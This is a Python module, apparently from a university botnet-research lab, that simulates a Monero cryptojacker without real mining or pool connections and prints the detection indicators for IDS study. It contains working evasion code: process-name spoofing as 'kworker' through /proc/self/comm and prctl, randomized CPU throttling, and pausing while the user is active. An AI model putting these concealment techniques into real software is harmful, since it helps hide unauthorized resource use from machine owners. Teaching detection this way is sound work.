"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Cryptojacking Simulation Module
 Environment: ISOLATED VM LAB ONLY
====================================================

Simulates unauthorized cryptocurrency mining behavior
without performing actual mining or connecting to any
real mining pool.

Key research behaviors implemented:
  1) CPU throttling to 20-30% to stay below user notice
  2) Process name spoofing (masquerades as 'syslogd', 'kworker')
  3) Multi-core awareness (spreads load across cores)
  4) Idle detection (pauses when user activity detected)
  5) Self-concealment via /proc/self/comm name change

IDS detection targets demonstrated:
  - psutil.cpu_percent() sustained above threshold
  - Process with obfuscated name consuming anomalous CPU
  - /proc/[pid]/exe points to unexpected binary

Detection evaded:
  - Simple top/htop: looks like normal system process
  - Single-sample CPU: too low to trigger alert
  - Rate-of-change monitoring: gentle slope, not spike

Teaching point: Sustained 25-30% CPU over 60s is the
detection fingerprint, not a single-sample spike.
"""

import os
import sys
import time
import math
import random
import signal
import struct
import hashlib
import threading
import ctypes
import multiprocessing
from datetime import datetime

# ── Configuration ─────────────────────────────────────────────
TARGET_CPU_PCT    = 0.25   # 25% CPU utilization target
CPU_VARIANCE      = 0.05   # ±5% variance to avoid flat-line detection
IDLE_THRESHOLD    = 0.60   # system CPU above this = pause (user is active)
IDLE_CHECK_SEC    = 5      # how often to check system load
CYCLE_MS          = 100    # work cycle: 100ms window
SPOOFED_NAME      = "kworker/0:1"   # fake process name

# In a real cryptojacker, these are passed to the mining algorithm.
# Here they are display-only — no actual crypto computation.
POOL_HOST    = "pool.monero.lab"    # fake pool (NXDOMAIN in isolated lab)
WALLET_ADDR  = "RESEARCH_WALLET_SIMULATION_ONLY"
ALGORITHM    = "RandomX (XMR)"     # Monero's CPU-friendly PoW

# ── Process name spoofing ─────────────────────────────────────

def spoof_process_name(name: str):
    """
    On Linux, overwrite /proc/self/comm to change the visible process name.
    This makes the process appear as 'kworker' or 'syslogd' in ps/top.
    Requires: write access to /proc/self/comm (usually allowed for own process).
    """
    try:
        with open("/proc/self/comm", "w") as f:
            f.write(name[:15])  # comm is limited to 15 chars
        print(f"[CJ] Process name spoofed -> '{name[:15]}'")
    except Exception as e:
        print(f"[CJ] Name spoof failed (non-Linux?): {e}")

    # Also attempt via ctypes prctl (more reliable on some kernels)
    try:
        PR_SET_NAME = 15
        lib = ctypes.CDLL("libc.so.6", use_errno=True)
        lib.prctl(PR_SET_NAME, name.encode()[:15] + b'\x00', 0, 0, 0)
    except Exception:
        pass


# ── CPU burn kernel ───────────────────────────────────────────

def _cpu_work_cycle(duration_ms: int):
    """
    Perform meaningless but CPU-intensive work for exactly duration_ms milliseconds.
    This simulates the hash computation inner loop of a miner.
    Uses SHA-256 chains — same pattern as real RandomX/CryptoNight work.
    """
    end = time.perf_counter() + duration_ms / 1000.0
    # Simulate hash chaining (RandomX-style work unit)
    state = os.urandom(32)
    hashes = 0
    while time.perf_counter() < end:
        state = hashlib.sha256(state).digest()
        hashes += 1
    return hashes

def _worker_thread(target_pct: float, stop_event: threading.Event,
                   stats: dict, worker_id: int):
    """
    Single worker thread implementing duty-cycle CPU throttling.

    Throttling mechanism:
      - Each CYCLE_MS window is split into:
          work_time = CYCLE_MS * target_pct   (burn CPU)
          sleep_time = CYCLE_MS * (1 - target_pct)  (yield)
      - Small random variance on target_pct prevents flat-line CPU signature.
      - Pause entirely if system load is too high (user is active).
    """
    total_hashes = 0

    while not stop_event.is_set():
        # Check system idle level every few cycles
        if random.random() < 0.1:
            try:
                import psutil
                sys_cpu = psutil.cpu_percent(interval=0)
                if sys_cpu > IDLE_THRESHOLD * 100:
                    # System is busy — pause to avoid user notice
                    time.sleep(2.0 + random.uniform(0, 1))
                    continue
            except ImportError:
                pass

        # Randomize target slightly to avoid flat-line CPU signature
        effective_pct = target_pct + random.uniform(-CPU_VARIANCE, CPU_VARIANCE)
        effective_pct = max(0.10, min(0.40, effective_pct))

        work_ms  = CYCLE_MS * effective_pct
        sleep_ms = CYCLE_MS * (1.0 - effective_pct)

        h = _cpu_work_cycle(int(work_ms))
        total_hashes += h

        time.sleep(sleep_ms / 1000.0)

    stats[worker_id] = total_hashes


# ── Simulated mining stats ────────────────────────────────────

class MiningStats:
    """Track and display simulated mining performance."""

    def __init__(self):
        self.start_time    = time.time()
        self.total_hashes  = 0
        self.accepted      = 0
        self.rejected      = 0
        self.hashrate_h_s  = 0.0
        self._lock         = threading.Lock()

    def update(self, hashes: int):
        with self._lock:
            self.total_hashes += hashes
            elapsed = max(1, time.time() - self.start_time)
            self.hashrate_h_s = self.total_hashes / elapsed
            # Simulate occasional "share accepted" messages
            if random.random() < 0.05:
                self.accepted += 1

    def report(self) -> str:
        with self._lock:
            elapsed = time.time() - self.start_time
            h_per_s = self.hashrate_h_s
            # Scale to simulate real XMR hashrates (display only)
            sim_h_s = h_per_s * 0.0001  # normalize to realistic range
            return (
                f"[CJ] Uptime: {elapsed:.0f}s | "
                f"Sim-hashrate: {sim_h_s:.2f} H/s | "
                f"Shares: {self.accepted} accepted | "
                f"Pool: {POOL_HOST} (isolated/NXDOMAIN)"
            )


# ── Main cryptojacking module ─────────────────────────────────

class CryptojackSimulator:
    """
    Simulates a Monero cryptojacker.
    Spawns N worker threads (N = min(2, cpu_count)) each burning
    TARGET_CPU_PCT of a core, for an aggregate ~25-30% system CPU.
    """

    def __init__(self, target_pct: float = TARGET_CPU_PCT, duration: int = 120):
        self.target_pct    = target_pct
        self.duration      = duration  # 0 = run indefinitely
        self.n_workers     = max(1, min(2, multiprocessing.cpu_count()))
        self.stop_event    = threading.Event()
        self.thread_stats  = {}
        self.mining_stats  = MiningStats()
        self._threads      = []
        self._stats_thread = None

    def _stats_loop(self):
        """Background thread: update mining stats and print status."""
        while not self.stop_event.is_set():
            total_new = sum(self.thread_stats.values())
            self.mining_stats.update(total_new)
            self.thread_stats = {i: 0 for i in range(self.n_workers)}
            print(self.mining_stats.report())
            time.sleep(10 + random.uniform(-2, 2))

    def start(self):
        """Launch the cryptojacker."""
        print(f"\n[CJ] {'='*50}")
        print(f"[CJ] Cryptojacking Module - AUA Research Lab")
        print(f"[CJ] Target CPU: {self.target_pct*100:.0f}% per core")
        print(f"[CJ] Workers: {self.n_workers} threads")
        print(f"[CJ] Algorithm: {ALGORITHM}")
        print(f"[CJ] Duration: {'indefinite' if self.duration == 0 else f'{self.duration}s'}")
        print(f"[CJ] {'='*50}\n")

        # Spoof process name to hide in process list
        spoof_process_name(SPOOFED_NAME)

        print(f"[CJ] PID: {os.getpid()}")
        print(f"[CJ] Visible name: '{SPOOFED_NAME}' (check: cat /proc/{os.getpid()}/comm)")
        print(f"[CJ] Original binary: {sys.argv[0]}")
        print(f"[CJ] IDS hook: /proc/{os.getpid()}/exe -> '{sys.argv[0]}' (mismatch = red flag)\n")

        # Start worker threads
        for i in range(self.n_workers):
            self.thread_stats[i] = 0
            t = threading.Thread(
                target=_worker_thread,
                args=(self.target_pct, self.stop_event, self.thread_stats, i),
                daemon=True,
                name=f"miner-{i}"
            )
            t.start()
            self._threads.append(t)

        # Start stats reporter
        self._stats_thread = threading.Thread(
            target=self._stats_loop, daemon=True, name="stats"
        )
        self._stats_thread.start()

        print(f"[CJ] Mining started. Detection indicators to watch:")
        print(f"[CJ]   psutil.cpu_percent() sustained ~{self.target_pct*100:.0f}%")
        print(f"[CJ]   /proc/{os.getpid()}/exe != /proc/{os.getpid()}/comm name")
        print(f"[CJ]   Process '{SPOOFED_NAME}' with unexpected CPU usage\n")

    def stop(self):
        """Stop all worker threads."""
        self.stop_event.set()
        for t in self._threads:
            t.join(timeout=2)
        print(f"\n[CJ] Stopped. Total simulated hashes: {self.mining_stats.total_hashes:,}")

    def run_for(self, seconds: int):
        """Start, run for `seconds`, then stop."""
        self.start()
        try:
            end = time.time() + seconds
            while time.time() < end:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        self.stop()


# ── IDS evasion analysis ──────────────────────────────────────

def analyze_cpu_signature(duration: int = 30):
    """
    Measure and display the CPU signature that the IDS sees.
    Shows why the throttling is hard to detect with single samples.
    """
    try:
        import psutil
    except ImportError:
        print("[CJ] psutil not installed — install with: pip3 install psutil")
        return

    print(f"\n[CJ] Measuring CPU signature for {duration}s...")
    print(f"[CJ] (IDS must sustain this measurement to detect cryptojacking)\n")

    samples = []
    for i in range(duration):
        cpu = psutil.cpu_percent(interval=1)
        samples.append(cpu)
        status = "▓" if cpu > TARGET_CPU_PCT * 100 else "░"
        bar = status * int(cpu / 5)
        print(f"  t={i+1:3d}s  CPU={cpu:5.1f}%  {bar}")

    avg  = sum(samples) / len(samples)
    peak = max(samples)
    print(f"\n[CJ] Average CPU: {avg:.1f}%  |  Peak: {peak:.1f}%")
    print(f"[CJ] IDS threshold: {TARGET_CPU_PCT*100:.0f}%")
    print(f"[CJ] Detectable by sustained-average monitor: {'YES' if avg > TARGET_CPU_PCT * 70 else 'BORDERLINE'}")


# ── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Cryptojacking Simulator - AUA Research Lab")
    parser.add_argument("--duration", type=int, default=60,
                        help="Run for N seconds (0=indefinite, default=60)")
    parser.add_argument("--cpu",      type=float, default=TARGET_CPU_PCT,
                        help=f"Target CPU fraction per core (default={TARGET_CPU_PCT})")
    parser.add_argument("--analyze",  action="store_true",
                        help="Run CPU signature analysis (with psutil)")
    args = parser.parse_args()

    print("=" * 60)
    print(" Cryptojacking Module - AUA Botnet Research Lab")
    print(" ISOLATED VM ONLY — NO REAL MINING OR POOL CONNECTION")
    print("=" * 60)

    def handle_sigterm(sig, frame):
        print("\n[CJ] Received SIGTERM — exiting cleanly")
        sys.exit(0)
    signal.signal(signal.SIGTERM, handle_sigterm)

    sim = CryptojackSimulator(target_pct=args.cpu,
                              duration=args.duration)

    if args.analyze:
        # Start first, then analyze
        sim.start()
        time.sleep(5)
        analyze_cpu_signature(duration=20)
        sim.stop()
    elif args.duration == 0:
        sim.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            sim.stop()
    else:
        sim.run_for(args.duration)
